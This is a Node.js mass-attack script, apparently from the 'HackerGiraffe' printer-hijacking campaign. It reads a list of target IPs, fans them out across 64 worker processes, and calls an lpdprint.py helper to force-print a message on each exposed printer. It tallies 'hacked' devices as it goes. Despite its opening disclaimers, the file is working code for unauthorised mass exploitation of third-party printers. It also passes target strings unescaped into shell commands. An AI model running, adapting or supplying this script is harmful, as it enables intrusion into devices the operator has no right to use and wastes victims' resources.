//FOR RESEARCH PURPOSES ONLY.
//YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS - DO NOT RUN THIS ON PRINTERS YOU DO NOT HAVE AUTHORIZATION TO PRINT ON
//I AM SERIOUS. DO NOT BE A SKID AND LEAVE PEOPLE'S STUFF ALONE. WE ALREADY WASTED ENOUGH PAPER AND INK.
//I am serious. Please. Don't try to have your own 5 minutes of fame. No one will think you are 'cool'. You will be a copycat.
//Try to learn and build your own programs. Be ethical. Be better than me.
//I am seriously asking you to leave people's printers alone, we made our point.
//Thank you, HackerGiraffe

const chalk = require('chalk');
const fs = require('fs');
const cluster = require('cluster');
const config = require('./config.json');

//Commented this out because what if I want to go faster than 8 CPUs
// const numCPUs = require('os').cpus().length;

//Number of threads
const numCPUs = 64;

//Exec
const { exec } = require('child_process');

//Counters
let count = 0;
let hacked = 1;

//Open file for reading
let array = fs.readFileSync(config.targetFile).toString().split("\n");

//Stolen function from StackOverflow
function splitUp(arr, n) {
    var rest = arr.length % n, // how much to divide
        restUsed = rest, // to keep track of the division over the elements
        partLength = Math.floor(arr.length / n),
        result = [];

    for (let i = 0; i < arr.length; i += partLength) {
        var end = partLength + i,
            add = false;

        if (rest !== 0 && restUsed) { // should add one element for the division
            end++;
            restUsed--; // we've used one division element now
            add = true;
        }

        result.push(arr.slice(i, end)); // part of the array

        if (add) {
            i++; // also increment i in the case we added an extra element for division
        }
    }

    return result;
}

var arrays = splitUp(array, numCPUs);

//Stolen from nodejs docs lol
if (cluster.isMaster) {
    console.log(chalk.yellow(`Master ${process.pid} is running`));

    //Counter
    var start = Date.now();

    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {

        //God bless Nodejs workers
        var worker = cluster.fork();
        worker.send(arrays[i]);

        worker.on('message', function (msg) {
            //Increment stats
            hacked += msg.hacked;
            count += msg.count;
            console.log(chalk.blue(`Progress: ${count}/${array.length} [${((count / array.length) * 100).toFixed(5)}%] Hacked: ${hacked}/${count} [${((hacked / count) * 100).toFixed(5)}%]`)); //Progress bar
            exec(`cat ./message.txt | sed "s/PRINTERNOHERE/${hacked}/g" > ./tmp.txt`); //Replace PRINTERNOHERE with number of hacked printers
        });
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died.`);
    });



    cluster.on('exit', function (worker) {
        // When the master has no more workers alive it
        // prints the elapsed time and then kills itself
        if (Object.keys(cluster.workers).length === 0) {
            console.log('Every worker has finished its job.');
            console.log('Elapsed Time: ' + (Date.now() - start) + 'ms');
            process.exit(1);
        }
    });

} else {
    console.log(chalk.blue(`Worker ${process.pid} started`));

    async function loopTargets(targets) {
        let counter = 0;
        for (const target in targets) {
            await runAttack(targets[target]);
            process.send({ count: 1, hacked: 0 })
        }
    }

    //I hate async await I can barely understand it
    async function runAttack(target) {
        return new Promise(resolve => {
            //timeout incase the IP is non responsive
            exec(`timeout 60 ./lpdprint.py ${target} ./tmp.txt`, (err, stdout, stderr) => {
                if (err) {
                    console.log(chalk.red(`Printed to ${target} failed.`))
                } else {
                    console.log(chalk.green(`Printed to ${target} successfully!`))
                    process.send({ count: 0, hacked: 1 })
                }
                resolve();
            })
        })
    }

    process.on('message', function (targets) {
        console.log(chalk.green.bold(`Worker ${process.pid} recieved ${targets.length} targets.`))
        loopTargets(targets);
    })
}
